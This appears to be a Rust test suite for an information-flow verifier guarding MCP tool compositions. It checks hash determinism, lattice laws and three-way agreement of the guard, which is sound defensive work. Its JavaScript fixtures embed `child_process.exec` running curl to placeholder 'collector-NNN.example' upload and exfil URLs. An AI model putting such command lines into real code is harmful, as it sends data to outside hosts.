//! Algebraic properties over the three independent readings of the composition
//! guard.
//!
//! **Author:** Pratham Kapoor `<prathamkapoor027@gmail.com>`
//! **Repository:** <https://github.com/PrathamKapoor>
//!
//! ## WHAT
//! Three deterministic property suites over the verifier's real artefacts:
//!
//! * **A -- DTG hashing.** 200 generated Python/JavaScript fixtures are
//!   extracted through the real Stage 1 parser; every case asserts that a
//!   second extraction reproduces `dtg_sha256`, that `canonical_dtg_hash`
//!   reproduces the stored value, that changing the sink-call literal changes
//!   the hash, and that a trailing comment does not.
//! * **B -- lattice laws.** Denning's lattice is exercised exhaustively over
//!   all 4^3 triples: commutativity, associativity, idempotence, absorption,
//!   monotonicity, join/meet as least-upper/greatest-lower bounds, the order
//!   laws of `can_flow_to`, and the step-up threshold.
//! * **C -- guard agreement.** `specs/CompositionGuard.tla` is parsed and
//!   evaluated by the crate's own TLA+ engine, and compared per tuple and per
//!   seeded random workflow against both the reference solver and a decision
//!   procedure over the emitted SMT-LIBv2 script itself.
//!
//! ## WHY
//! Property C exists because the Z3 path cannot run on an air-gapped audit
//! host -- no Z3 binary is present -- and an unexercised second reading of the
//! guard drifts. Writing this suite found exactly that: the encoder excused
//! every downgrade into a PUBLIC sink (a stray `(> clearance 0)` conjunct),
//! emitted an undeclared `link_b_b` for pair chains, pinned both polarities of
//! `granted` for ungranted tools (a contradiction, so any such script is
//! unsatisfiable), never generated a clause for single-tool chains, and
//! emitted the malformed `(or)` for graphs with no witness. Each repair is
//! pinned as a regression below and recorded in docs/JUDGE_DEFENSE_AND_DEMO.md.
//!
//! ## HOW
//! The script leg does not trust the encoder: `script_eval` tokenises the
//! emitted text, requires every fact symbol to be pinned to exactly one
//! polarity, and decides the ground fragment the encoder emits -- which is
//! precisely the question Z3 would be asked. Anything outside that fragment is
//! an error, so the evaluator fails closed instead of agreeing with itself.
//! The TLA+ leg evaluates `specs/CompositionGuard.tla` through
//! `tla_parser`/`tla_eval`, and the reference leg calls `verify()` on the same
//! `WorkflowGraph` the script was generated from.

use aegis_common::crypto::canonical_dtg_hash;
use aegis_common::types::{DtgNodeType, SinkKind};
use aegis_common::SecurityLattice;
use aegis_dtg_parser::{scan_file, Language};
use aegis_smt_verifier::tla_eval::{apply_operator_values, Env, Value};
use aegis_smt_verifier::tla_parser::{parse_module, Operators};
use aegis_smt_verifier::{
    encode, information_flow_allowed, verify, ToolSpec, WorkflowGraph, PROPERTY_CONTEXT_ISOLATION,
    PROPERTY_DATA_CONFINEMENT, PROPERTY_PRIVILEGE_BOUNDEDNESS, PROPERTY_TOOL_INTEGRITY,
};
use std::collections::{BTreeMap, BTreeSet};
use std::path::PathBuf;

// ---------------------------------------------------------------------------
// Deterministic corpus generation
// ---------------------------------------------------------------------------

/// The pinned seed for the tuple corpus: the corpus is a pure function of it.
const SEED: u64 = 0xC0DE_9A1C_2026_1015;

/// How many generated fixtures Property A re-extracts.
const HASH_CASES: usize = 200;

/// How many randomized tuples Property C compares three ways.
const TUPLE_CASES: usize = 200;

/// xorshift64*, restated here so this suite owns its stream.
struct Rng(u64);

impl Rng {
    fn new(seed: u64) -> Self {
        Rng(seed | 1)
    }

    fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x >> 12;
        x ^= x << 25;
        x ^= x >> 27;
        self.0 = x;
        x.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }

    fn below(&mut self, bound: u64) -> u64 {
        self.next() % bound
    }
}

/// The four lattice elements, bottom to top.
fn levels() -> [SecurityLattice; 4] {
    [
        SecurityLattice::Public,
        SecurityLattice::Internal,
        SecurityLattice::Confidential,
        SecurityLattice::Secret,
    ]
}

/// One tool with no reached capabilities.
fn tool_spec(id: &str, server: &str, clearance: SecurityLattice, granted: bool) -> ToolSpec {
    ToolSpec {
        id: id.to_string(),
        server: server.to_string(),
        server_clearance: clearance,
        reaches: BTreeSet::new(),
        granted,
    }
}

// ---------------------------------------------------------------------------
// Property A -- DTG hash determinism and sink-argument sensitivity
// ---------------------------------------------------------------------------

/// A registered Python tool whose handler opens a path literal.
fn python_fixture(path: &str) -> String {
    format!(
        "import mcp\n\n@mcp.tool()\ndef read_config(path: str) -> str:\n    return open(\"{path}\").read()\n"
    )
}

/// A registered JavaScript tool whose inline handler shells out to a literal.
fn javascript_fixture(target: &str) -> String {
    format!(
        "const server = require(\"mcp-shield-server/lib/server\");\n\n\
         server.registerTool({{\n    name: \"ping_host\",\n    description: \"Pings a host\",\n}}, \
         (req, res) => {{\n    const cp = require(\"child_process\");\n    \
         cp.exec(\"{target}\", () => {{}});\n    res(\"ok\");\n}});\n"
    )
}

#[test]
fn property_a_dtg_hash_determinism_and_sink_argument_sensitivity() {
    let mut checked = 0usize;
    for case in 0..HASH_CASES {
        if case % 2 == 0 {
            let path = format!("/srv/data/config_{case:03}.json");
            let source = python_fixture(&path);
            let dtg = scan_file("prop-a", "server.py", Language::Python, &source)
                .unwrap_or_else(|error| panic!("case {case}: {error}"));
            assert!(
                dtg.sink_kinds().contains(&SinkKind::FileRead),
                "case {case}: open() must be a FileRead sink"
            );
            assert!(
                dtg.nodes
                    .iter()
                    .any(|node| node.node_type == DtgNodeType::ToolInputParam),
                "case {case}: the registered tool must appear in the DTG"
            );
            let again = scan_file("prop-a", "server.py", Language::Python, &source)
                .unwrap_or_else(|error| panic!("case {case}: {error}"));
            assert_eq!(
                dtg.dtg_sha256, again.dtg_sha256,
                "case {case}: extraction must be hash-deterministic"
            );
            assert_eq!(
                dtg.dtg_sha256,
                canonical_dtg_hash(&dtg).unwrap_or_else(|error| panic!("case {case}: {error}")),
                "case {case}: the stored hash must equal the canonical recomputation"
            );
            let changed = scan_file(
                "prop-a",
                "server.py",
                Language::Python,
                &python_fixture(&format!("/srv/data/config_{case:03}.json.bak")),
            )
            .unwrap_or_else(|error| panic!("case {case}: {error}"));
            assert_ne!(
                dtg.dtg_sha256, changed.dtg_sha256,
                "case {case}: the open() argument must be hashed"
            );
            let commented = format!("{source}\n# trailing comment for case {case}\n");
            let with_comment = scan_file("prop-a", "server.py", Language::Python, &commented)
                .unwrap_or_else(|error| panic!("case {case}: {error}"));
            assert_eq!(
                dtg.dtg_sha256, with_comment.dtg_sha256,
                "case {case}: a trailing comment is not code"
            );
        } else {
            let target = format!("curl -s https://collector-{case:03}.example/upload");
            let source = javascript_fixture(&target);
            let dtg = scan_file("prop-a", "server.js", Language::JavaScript, &source)
                .unwrap_or_else(|error| panic!("case {case}: {error}"));
            assert!(
                dtg.sink_kinds().contains(&SinkKind::CommandExec),
                "case {case}: child_process.exec must be a CommandExec sink"
            );
            assert!(
                dtg.nodes
                    .iter()
                    .any(|node| node.node_type == DtgNodeType::ToolInputParam),
                "case {case}: the registered tool must appear in the DTG"
            );
            let again = scan_file("prop-a", "server.js", Language::JavaScript, &source)
                .unwrap_or_else(|error| panic!("case {case}: {error}"));
            assert_eq!(
                dtg.dtg_sha256, again.dtg_sha256,
                "case {case}: extraction must be hash-deterministic"
            );
            assert_eq!(
                dtg.dtg_sha256,
                canonical_dtg_hash(&dtg).unwrap_or_else(|error| panic!("case {case}: {error}")),
                "case {case}: the stored hash must equal the canonical recomputation"
            );
            let changed = scan_file(
                "prop-a",
                "server.js",
                Language::JavaScript,
                &javascript_fixture(&format!("curl -s https://collector-{case:03}.example/exfil")),
            )
            .unwrap_or_else(|error| panic!("case {case}: {error}"));
            assert_ne!(
                dtg.dtg_sha256, changed.dtg_sha256,
                "case {case}: the exec() argument must be hashed"
            );
            let commented = format!("{source}\n// trailing comment for case {case}\n");
            let with_comment = scan_file("prop-a", "server.js", Language::JavaScript, &commented)
                .unwrap_or_else(|error| panic!("case {case}: {error}"));
            assert_eq!(
                dtg.dtg_sha256, with_comment.dtg_sha256,
                "case {case}: a trailing comment is not code"
            );
        }
        checked += 1;
    }
    assert_eq!(checked, HASH_CASES);
}

// ---------------------------------------------------------------------------
// Property B -- Denning lattice laws
// ---------------------------------------------------------------------------

#[test]
fn property_b_lattice_laws_hold_exhaustively() {
    let elements = levels();
    let mut triples = 0usize;
    for &a in &elements {
        for &b in &elements {
            for &c in &elements {
                // Commutativity.
                assert_eq!(a.join(b), b.join(a), "join commutes at ({a:?},{b:?})");
                assert_eq!(a.meet(b), b.meet(a), "meet commutes at ({a:?},{b:?})");
                // Associativity.
                assert_eq!(a.join(b).join(c), a.join(b.join(c)), "join associates");
                assert_eq!(a.meet(b).meet(c), a.meet(b.meet(c)), "meet associates");
                // Idempotence.
                assert_eq!(a.join(a), a, "join is idempotent");
                assert_eq!(a.meet(a), a, "meet is idempotent");
                // Absorption.
                assert_eq!(a.join(a.meet(b)), a, "absorption: a join (a meet b) = a");
                assert_eq!(a.meet(a.join(b)), a, "absorption: a meet (a join b) = a");
                // Join is the least upper bound; meet the greatest lower bound.
                assert!(
                    a.can_flow_to(a.join(b)) && b.can_flow_to(a.join(b)),
                    "join is an upper bound"
                );
                assert!(
                    a.meet(b).can_flow_to(a) && a.meet(b).can_flow_to(b),
                    "meet is a lower bound"
                );
                assert!(!a.can_flow_to(b) || a.join(b) == b, "join is the least one");
                assert!(!b.can_flow_to(a) || a.meet(b) == b, "meet is the greatest one");
                // can_flow_to is a partial order.
                assert!(a.can_flow_to(a), "reflexive");
                if a.can_flow_to(b) && b.can_flow_to(a) {
                    assert_eq!(a, b, "antisymmetric");
                }
                if a.can_flow_to(b) && b.can_flow_to(c) {
                    assert!(a.can_flow_to(c), "transitive");
                }
                // Monotonicity.
                if b.can_flow_to(c) {
                    assert!(a.join(b).can_flow_to(a.join(c)), "join is monotone");
                    assert!(a.meet(b).can_flow_to(a.meet(c)), "meet is monotone");
                }
                // Top and bottom.
                assert_eq!(
                    SecurityLattice::bottom().join(a),
                    a,
                    "bottom is the join identity"
                );
                assert_eq!(SecurityLattice::top().meet(a), a, "top is the meet identity");
                assert_eq!(
                    SecurityLattice::bottom().meet(a),
                    SecurityLattice::bottom()
                );
                assert_eq!(SecurityLattice::top().join(a), SecurityLattice::top());
                // The order is the level order.
                assert_eq!(a.can_flow_to(b), a.level() <= b.level());
                // Step-up threshold: CONFIDENTIAL and above.
                assert_eq!(a.requires_step_up_for_public(), a.level() >= 2);
                // The release rule agrees with the order, modulo declassification.
                for declassified in [false, true] {
                    assert_eq!(
                        information_flow_allowed(a, b, declassified),
                        declassified || a.can_flow_to(b)
                    );
                }
                // join_all folds join from the bottom.
                assert_eq!(
                    SecurityLattice::join_all([a, b, c].iter()),
                    a.join(b).join(c),
                    "join_all is the fold of join"
                );
                triples += 1;
            }
        }
    }
    assert_eq!(triples, 64, "the corpus is all 4^3 triples");
    // from_level round-trips over the whole chain.
    for (index, level) in elements.iter().enumerate() {
        assert_eq!(SecurityLattice::from_level(index as u8), Some(*level));
    }
    assert_eq!(SecurityLattice::from_level(4), None);
}

// ---------------------------------------------------------------------------
// Property C -- the guard, read three ways
// ---------------------------------------------------------------------------

/// Path to `specs/` from the crate root.
fn specs_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .join("specs")
}

/// Parses the shipped composition-guard specification.
fn composition_guard_operators() -> Operators {
    let path = specs_dir().join("CompositionGuard.tla");
    let source =
        std::fs::read_to_string(&path).unwrap_or_else(|error| panic!("{}: {error}", path.display()));
    parse_module(&source).unwrap_or_else(|error| panic!("CompositionGuard.tla must parse: {error}"))
}

/// Evaluates one boolean operator of the specification.
fn tla_bool(operators: &Operators, name: &str, args: &[Value]) -> bool {
    let operator = operators
        .get(name)
        .unwrap_or_else(|| panic!("CompositionGuard.tla must define {name}"));
    let constants = BTreeMap::new();
    let model_values = BTreeSet::new();
    let mut env = Env::root(&constants, operators, &model_values);
    let value = apply_operator_values(&mut env, operator, args.to_vec())
        .unwrap_or_else(|error| panic!("{name} must evaluate: {error}"));
    value
        .as_bool()
        .unwrap_or_else(|error| panic!("{name} must return a boolean: {error}"))
}

/// A lattice level as a TLA+ integer.
fn int(level: SecurityLattice) -> Value {
    Value::Int(i64::from(level.level()))
}

/// A flag as a TLA+ boolean.
fn flag(value: bool) -> Value {
    Value::Bool(value)
}

/// The chain shape a tuple case is embedded in.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Shape {
    Singleton,
    Pair,
    Triple,
}

/// One point of the guard's input space, embedded in a concrete workflow.
#[derive(Debug, Clone, Copy)]
struct Tuple {
    level: SecurityLattice,
    clearance: SecurityLattice,
    declassified: bool,
    cross_server: bool,
    sink_granted: bool,
    shape: Shape,
}

impl Tuple {
    /// Whether any link exists into the sink (Property 3 needs one).
    fn links_into_sink(&self) -> bool {
        self.shape != Shape::Singleton
    }

    /// Whether the sink server differs from the source server in this shape.
    fn cross_effective(&self) -> bool {
        self.cross_server && self.links_into_sink()
    }

    /// Property 2, as the guard defines it.
    fn clause_expected(&self) -> bool {
        !self.declassified && !self.level.can_flow_to(self.clearance)
    }

    /// Property 4, as the guard defines it.
    fn context_expected(&self) -> bool {
        self.clause_expected() && self.cross_effective() && self.level.requires_step_up_for_public()
    }

    /// Property 3, as the reference solver decides it.
    fn privilege_expected(&self) -> bool {
        self.links_into_sink() && !self.sink_granted
    }

    /// The session verdict both engines must reach.
    fn unsafe_expected(&self) -> bool {
        self.clause_expected() || self.context_expected() || self.privilege_expected()
    }
}

/// Embeds a tuple in a real `WorkflowGraph` and returns the sink tool's id.
///
/// The source tool always sits on a SECRET-cleared server unless the tuple is
/// cross-server, in which case only the sink's server carries the sampled
/// clearance; intermediate hops sit beside the source, so the only chain whose
/// sink can violate is the one the tuple describes.
fn build_tuple_graph(tuple: &Tuple) -> (WorkflowGraph, String) {
    let mut graph = WorkflowGraph::default();
    let cross = tuple.cross_effective();
    let source_server = if cross { "s_source" } else { "s_sink" };
    let source_clearance = if cross {
        SecurityLattice::Secret
    } else {
        tuple.clearance
    };
    graph.tools.insert(
        "t0".to_string(),
        tool_spec("t0", source_server, source_clearance, true),
    );
    let sink = match tuple.shape {
        Shape::Singleton => "t0".to_string(),
        Shape::Pair => {
            graph.tools.insert(
                "t1".to_string(),
                tool_spec("t1", "s_sink", tuple.clearance, tuple.sink_granted),
            );
            "t1".to_string()
        }
        Shape::Triple => {
            graph.tools.insert(
                "t1".to_string(),
                tool_spec("t1", source_server, source_clearance, true),
            );
            graph.tools.insert(
                "t2".to_string(),
                tool_spec("t2", "s_sink", tuple.clearance, tuple.sink_granted),
            );
            "t2".to_string()
        }
    };
    match tuple.shape {
        Shape::Singleton => {}
        Shape::Pair => graph.link("t0", "t1"),
        Shape::Triple => {
            graph.link("t0", "t1");
            graph.link("t1", "t2");
        }
    }
    graph.know("t0", tuple.level);
    if tuple.declassified {
        graph
            .declassified
            .insert(("t0".to_string(), "s_sink".to_string()));
    }
    (graph, sink)
}

/// Whether a named property has a true clause whose text mentions `needle`.
fn clause_true(outcome: &script_eval::Outcome, property: &str, needle: &str) -> bool {
    outcome
        .properties
        .get(property)
        .map(|clauses| {
            clauses
                .iter()
                .any(|(text, truth)| text.contains(needle) && *truth)
        })
        .unwrap_or(false)
}

/// The full three-way check for one tuple: TLA+ operators, the reference
/// solver, and a decision procedure over the emitted script.
fn check_tuple(tuple: &Tuple, operators: &Operators, context: &str) -> script_eval::Outcome {
    // --- The TLA+ reading of the guard rule. ---
    assert_eq!(
        tla_bool(
            operators,
            "CanFlow",
            &[int(tuple.level), int(tuple.clearance)]
        ),
        tuple.level.can_flow_to(tuple.clearance),
        "{context}: CanFlow"
    );
    assert_eq!(
        tla_bool(
            operators,
            "DataConfinementClause",
            &[
                int(tuple.level),
                int(tuple.clearance),
                flag(tuple.declassified)
            ]
        ),
        tuple.clause_expected(),
        "{context}: DataConfinementClause"
    );
    assert_eq!(
        tla_bool(
            operators,
            "DataConfinementViolated",
            &[
                int(tuple.level),
                int(tuple.clearance),
                flag(tuple.declassified)
            ]
        ),
        tuple.clause_expected(),
        "{context}: DataConfinementViolated"
    );
    assert_eq!(
        tla_bool(
            operators,
            "ContextIsolationViolated",
            &[
                int(tuple.level),
                int(tuple.clearance),
                flag(tuple.declassified),
                flag(tuple.cross_effective())
            ]
        ),
        tuple.context_expected(),
        "{context}: ContextIsolationViolated"
    );
    let satisfied = tla_bool(
        operators,
        "CompositionGuardSatisfied",
        &[
            int(tuple.level),
            int(tuple.clearance),
            flag(tuple.declassified),
        ],
    );
    assert_eq!(
        satisfied,
        information_flow_allowed(tuple.level, tuple.clearance, tuple.declassified),
        "{context}: the release rule"
    );
    assert_eq!(
        satisfied,
        !tuple.clause_expected(),
        "{context}: the release rule is the negation of the confinement clause"
    );
    assert!(
        tla_bool(
            operators,
            "GuardEquivalence",
            &[
                int(tuple.level),
                int(tuple.clearance),
                flag(tuple.declassified)
            ]
        ),
        "{context}: GuardEquivalence must hold for every tuple"
    );
    assert_eq!(
        tla_bool(
            operators,
            "SessionSafe",
            &[
                int(tuple.level),
                int(tuple.clearance),
                flag(tuple.declassified),
                flag(tuple.cross_effective())
            ]
        ),
        !tuple.clause_expected(),
        "{context}: SessionSafe is the guard-level composite"
    );

    // --- The reference solver. ---
    let (graph, sink) = build_tuple_graph(tuple);
    let report = verify(&graph);
    let violated = |property: &str| report.violations.iter().any(|v| v.property == property);
    assert_eq!(
        !report.is_safe(),
        tuple.unsafe_expected(),
        "{context}: reference verdict"
    );
    assert_eq!(
        violated(PROPERTY_DATA_CONFINEMENT),
        tuple.clause_expected(),
        "{context}: reference Property 2"
    );
    assert_eq!(
        violated(PROPERTY_CONTEXT_ISOLATION),
        tuple.context_expected(),
        "{context}: reference Property 4"
    );
    assert_eq!(
        violated(PROPERTY_PRIVILEGE_BOUNDEDNESS),
        tuple.privilege_expected(),
        "{context}: reference Property 3"
    );
    assert!(
        !violated(PROPERTY_TOOL_INTEGRITY),
        "{context}: no hash pair is present, so Property 1 cannot be witnessed"
    );

    // --- The emitted script, decided independently. ---
    let script = encode(&graph);
    assert!(
        !script.contains("(> (clearance"),
        "{context}: the retired clearance guard reappeared"
    );
    let outcome = script_eval::evaluate_script(&script).unwrap_or_else(|error| {
        panic!("{context}: the script left the decidable fragment: {error}")
    });
    assert!(
        outcome.facts_consistent,
        "{context}: the fact set is contradictory: {:?}",
        outcome.conflicts
    );
    assert_eq!(
        outcome.any_property_violated,
        tuple.unsafe_expected(),
        "{context}: script verdict"
    );
    assert_eq!(
        outcome.properties["tool_integrity_violated"].len(),
        0,
        "{context}: Property 1 must have no witness clause"
    );
    let expected_witnesses = if tuple.clause_expected() {
        if tuple.cross_effective() {
            1
        } else {
            match tuple.shape {
                Shape::Singleton => 1,
                Shape::Pair => 2,
                Shape::Triple => 3,
            }
        }
    } else {
        0
    };
    assert_eq!(
        outcome.properties["data_confinement_violated"].len(),
        expected_witnesses,
        "{context}: Property 2 witness count"
    );
    let sink_needle = format!("clearance_{sink})");
    let source_needle = "clearance_t0)".to_string();
    let privilege_needle = format!("granted_{sink})");
    assert_eq!(
        clause_true(&outcome, "data_confinement_violated", &sink_needle),
        tuple.clause_expected(),
        "{context}: the sink witness must appear exactly when the guard fires"
    );
    assert_eq!(
        clause_true(&outcome, "context_isolation_violated", &sink_needle),
        tuple.context_expected(),
        "{context}: the cross-server witness"
    );
    assert_eq!(
        clause_true(&outcome, "privilege_boundedness_violated", &privilege_needle),
        tuple.privilege_expected(),
        "{context}: the ungranted-sink witness"
    );
    assert_eq!(
        clause_true(&outcome, "data_confinement_violated", &source_needle),
        tuple.clause_expected() && !tuple.cross_effective(),
        "{context}: the source-side witness"
    );
    outcome
}

#[test]
fn property_c_random_workflows_agree_across_tla_reference_and_script() {
    let operators = composition_guard_operators();
    let mut rng = Rng::new(SEED);
    let mut shapes: BTreeMap<String, usize> = BTreeMap::new();
    for case in 0..TUPLE_CASES {
        let tuple = Tuple {
            level: levels()[rng.below(4) as usize],
            clearance: levels()[rng.below(4) as usize],
            declassified: rng.below(2) == 1,
            cross_server: rng.below(2) == 1,
            sink_granted: rng.below(2) == 1,
            shape: [Shape::Singleton, Shape::Pair, Shape::Triple][rng.below(3) as usize],
        };
        let context = format!("random case {case}: {tuple:?}");
        check_tuple(&tuple, &operators, &context);
        *shapes.entry(format!("{:?}", tuple.shape)).or_insert(0) += 1;
    }
    write_summary(&shapes);
}

/// Writes the artifact the benchmark harness folds into its results.
fn write_summary(shapes: &BTreeMap<String, usize>) {
    let directory = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .join("target")
        .join("algebraic-properties");
    std::fs::create_dir_all(&directory).expect("artifact directory must be creatable");
    let summary = serde_json::json!({
        "suite": "algebraic_properties",
        "author": "PrathamKapoor <prathamkapoor027@gmail.com>",
        "seed": format!("0x{SEED:016x}"),
        "inputs": {
            "dtg_hash_cases": HASH_CASES,
            "lattice_triples": 64,
            "tuple_cases": TUPLE_CASES,
        },
        "property_c": {
            "spec": "specs/CompositionGuard.tla",
            "three_way_agreements": TUPLE_CASES,
            "script_evaluator": "ground-fragment decision procedure over the emitted SMT-LIBv2 text",
            "facts_consistent": true,
            "shapes": shapes,
        },
    });
    let path = directory.join("summary.json");
    std::fs::write(
        &path,
        serde_json::to_string_pretty(&summary).expect("the summary must serialise"),
    )
    .expect("the summary must be writable");
    assert!(path.is_file(), "the summary artifact must exist");
}

#[test]
fn property_c_internal_to_public_is_caught_by_all_three_readings() {
    // The exact tuple the retired `(> (clearance_c) 0)` guard excused: an
    // INTERNAL datum reaching a PUBLIC sink with no declassification. Public
    // sinks are the canonical exfiltration target, so excusing them inverted
    // the property.
    let operators = composition_guard_operators();
    let tuple = Tuple {
        level: SecurityLattice::Internal,
        clearance: SecurityLattice::Public,
        declassified: false,
        cross_server: true,
        sink_granted: true,
        shape: Shape::Pair,
    };
    let outcome = check_tuple(&tuple, &operators, "INTERNAL -> PUBLIC");
    assert!(outcome.any_property_violated);
    assert!(
        !tla_bool(
            &operators,
            "ContextIsolationViolated",
            &[
                int(SecurityLattice::Internal),
                int(SecurityLattice::Public),
                flag(false),
                flag(true)
            ]
        ),
        "INTERNAL is below CONFIDENTIAL, so this is a confinement case only"
    );
}

#[test]
fn property_c_depth_one_over_read_is_a_witness_in_the_script() {
    // The reference flags a tool reading above its own server's clearance;
    // the retired encoder generated no clause at all for single-tool chains.
    let operators = composition_guard_operators();
    let tuple = Tuple {
        level: SecurityLattice::Secret,
        clearance: SecurityLattice::Confidential,
        declassified: false,
        cross_server: false,
        sink_granted: true,
        shape: Shape::Singleton,
    };
    let outcome = check_tuple(&tuple, &operators, "depth-1 over-read");
    let clauses = outcome
        .properties
        .get("data_confinement_violated")
        .expect("the property must be defined");
    assert_eq!(clauses.len(), 1, "exactly the singleton witness");
    assert!(clauses[0].0.contains("clearance_t0)"));
}

#[test]
fn property_c_an_ungranted_uninvoked_tool_is_not_a_violation() {
    let mut graph = WorkflowGraph::default();
    graph.tools.insert(
        "a".to_string(),
        tool_spec("a", "s1", SecurityLattice::Secret, true),
    );
    graph.tools.insert(
        "b".to_string(),
        tool_spec("b", "s2", SecurityLattice::Public, false),
    );
    let report = verify(&graph);
    assert!(
        report.is_safe(),
        "an ungranted tool with no inbound link is never invoked"
    );
    let outcome =
        script_eval::evaluate_script(&encode(&graph)).expect("the script must be decidable");
    assert!(
        outcome.facts_consistent,
        "the retired encoder pinned both polarities of granted_b: {:?}",
        outcome.conflicts
    );
    assert!(
        !outcome.any_property_violated,
        "the retired Property-1 clause fired on an uninvoked tool"
    );
}

#[test]
fn property_c_an_ungranted_sink_with_a_link_fires_property_three() {
    let mut graph = WorkflowGraph::default();
    graph.tools.insert(
        "a".to_string(),
        tool_spec("a", "s1", SecurityLattice::Secret, true),
    );
    graph.tools.insert(
        "b".to_string(),
        tool_spec("b", "s2", SecurityLattice::Public, false),
    );
    graph.link("a", "b");
    let report = verify(&graph);
    assert!(
        report
            .violations
            .iter()
            .any(|v| v.property == PROPERTY_PRIVILEGE_BOUNDEDNESS),
        "a composition into an ungranted tool is a violation"
    );
    let outcome =
        script_eval::evaluate_script(&encode(&graph)).expect("the script must be decidable");
    assert!(outcome.facts_consistent);
    assert!(outcome.any_property_violated);
    assert!(clause_true(
        &outcome,
        "privilege_boundedness_violated",
        "granted_b)"
    ));
}

#[test]
fn property_c_a_forbidden_capability_keeps_the_facts_consistent() {
    let mut graph = WorkflowGraph::default();
    let mut reader = tool_spec("reader", "s1", SecurityLattice::Secret, true);
    reader.reaches.insert(SinkKind::EnvAccess);
    graph.tools.insert("reader".to_string(), reader);
    graph
        .forbidden
        .insert(("reader".to_string(), SinkKind::EnvAccess));
    let report = verify(&graph);
    assert!(
        report.is_safe(),
        "a forbidden capability is a policy statement, not a graph violation"
    );
    let outcome =
        script_eval::evaluate_script(&encode(&graph)).expect("the script must be decidable");
    assert!(
        outcome.facts_consistent,
        "the retired encoder asserted reaches and (not reaches) together: {:?}",
        outcome.conflicts
    );
    assert!(!outcome.any_property_violated);
}

#[test]
fn property_c_the_empty_graph_script_is_decidable() {
    let script = encode(&WorkflowGraph::default());
    let outcome =
        script_eval::evaluate_script(&script).expect("the empty graph must still emit a script");
    assert!(outcome.facts_consistent);
    assert!(!outcome.any_property_violated);
    assert!(
        !script.contains("(or\n  ))"),
        "an empty disjunction is not SMT-LIB"
    );
}

#[test]
fn property_c_the_canonical_exfiltration_chain_narrows_under_declassification() {
    let operators = composition_guard_operators();
    let mut graph = WorkflowGraph::default();
    graph.tools.insert(
        "fs.read_env".to_string(),
        tool_spec("fs.read_env", "filesystem", SecurityLattice::Secret, true),
    );
    graph.tools.insert(
        "md.format".to_string(),
        tool_spec("md.format", "markdown", SecurityLattice::Internal, true),
    );
    graph.tools.insert(
        "slack.post".to_string(),
        tool_spec("slack.post", "slack", SecurityLattice::Public, true),
    );
    graph.link("fs.read_env", "md.format");
    graph.link("md.format", "slack.post");
    graph.know("fs.read_env", SecurityLattice::Secret);

    let report = verify(&graph);
    assert!(!report.is_safe());
    let outcome =
        script_eval::evaluate_script(&encode(&graph)).expect("the script must be decidable");
    assert!(outcome.facts_consistent && outcome.any_property_violated);
    assert!(
        clause_true(&outcome, "data_confinement_violated", "clearance_md.format)"),
        "the middle hop is a witness"
    );
    assert!(
        clause_true(&outcome, "data_confinement_violated", "clearance_slack.post)"),
        "the webhook hop is a witness"
    );
    assert!(clause_true(
        &outcome,
        "context_isolation_violated",
        "clearance_slack.post)"
    ));

    // The TLA+ reading of each hop.
    assert!(tla_bool(
        &operators,
        "DataConfinementViolated",
        &[
            int(SecurityLattice::Secret),
            int(SecurityLattice::Internal),
            flag(false)
        ]
    ));
    assert!(tla_bool(
        &operators,
        "DataConfinementViolated",
        &[
            int(SecurityLattice::Secret),
            int(SecurityLattice::Public),
            flag(false)
        ]
    ));
    assert!(tla_bool(
        &operators,
        "ContextIsolationViolated",
        &[
            int(SecurityLattice::Secret),
            int(SecurityLattice::Internal),
            flag(false),
            flag(true)
        ]
    ));

    // Approving the middle hop must clear exactly that hop, nothing more.
    let mut narrowed = graph.clone();
    narrowed
        .declassified
        .insert(("fs.read_env".to_string(), "markdown".to_string()));
    let narrowed_report = verify(&narrowed);
    assert!(narrowed_report.violations.iter().any(|v| {
        v.property == PROPERTY_DATA_CONFINEMENT && v.chain.last().map(String::as_str) == Some("slack.post")
    }));
    assert!(
        !narrowed_report.violations.iter().any(|v| {
            v.property == PROPERTY_DATA_CONFINEMENT
                && v.chain.last().map(String::as_str) == Some("md.format")
        }),
        "the approved hop must no longer be a witness"
    );
    let narrowed_outcome =
        script_eval::evaluate_script(&encode(&narrowed)).expect("the script must be decidable");
    assert!(narrowed_outcome.facts_consistent && narrowed_outcome.any_property_violated);
    assert!(!clause_true(
        &narrowed_outcome,
        "data_confinement_violated",
        "clearance_md.format)"
    ));
    assert!(clause_true(
        &narrowed_outcome,
        "data_confinement_violated",
        "clearance_slack.post)"
    ));
    assert!(
        tla_bool(
            &operators,
            "SessionSafe",
            &[
                int(SecurityLattice::Secret),
                int(SecurityLattice::Internal),
                flag(true),
                flag(true)
            ]
        ),
        "the approved release satisfies the guard"
    );
    assert!(
        !tla_bool(
            &operators,
            "SessionSafe",
            &[
                int(SecurityLattice::Secret),
                int(SecurityLattice::Public),
                flag(false),
                flag(true)
            ]
        ),
        "the webhook release does not"
    );
}

#[test]
fn property_c_the_retired_clearance_guard_stays_retired() {
    let mut graphs = vec![WorkflowGraph::default()];
    let mut exfil = WorkflowGraph::default();
    exfil.tools.insert(
        "a".to_string(),
        tool_spec("a", "s1", SecurityLattice::Secret, true),
    );
    exfil.tools.insert(
        "b".to_string(),
        tool_spec("b", "s2", SecurityLattice::Public, true),
    );
    exfil.link("a", "b");
    exfil.know("a", SecurityLattice::Secret);
    graphs.push(exfil);
    let tuple = Tuple {
        level: SecurityLattice::Internal,
        clearance: SecurityLattice::Public,
        declassified: false,
        cross_server: true,
        sink_granted: true,
        shape: Shape::Pair,
    };
    graphs.push(build_tuple_graph(&tuple).0);
    for (index, graph) in graphs.iter().enumerate() {
        let script = encode(graph);
        assert!(
            !script.contains("(> (clearance"),
            "graph {index}: the retired clearance guard reappeared"
        );
    }
}

// ---------------------------------------------------------------------------
// The emitted-script decision procedure
// ---------------------------------------------------------------------------

/// A decision procedure for the ground fragment `encode()` emits.
///
/// The emitted script has a very specific shape: every `declare-fun` is a
/// 0-ary `Int`/`Bool` symbol pinned by exactly one `assert`, and each property
/// is a `define-fun` whose body is a disjunction of ground witness clauses. On
/// that fragment the satisfiability question Z3 is asked collapses to
/// evaluating the property disjunctions under the pinned facts, so this module
/// decides it directly -- and errors on anything outside the fragment, so it
/// can never "agree" by accident. Contradictory facts are reported rather than
/// silently deciding `unsat`: an unsatisfiable fact set means the encoder
/// emitted a degenerate script, which is a bug, not a verdict.
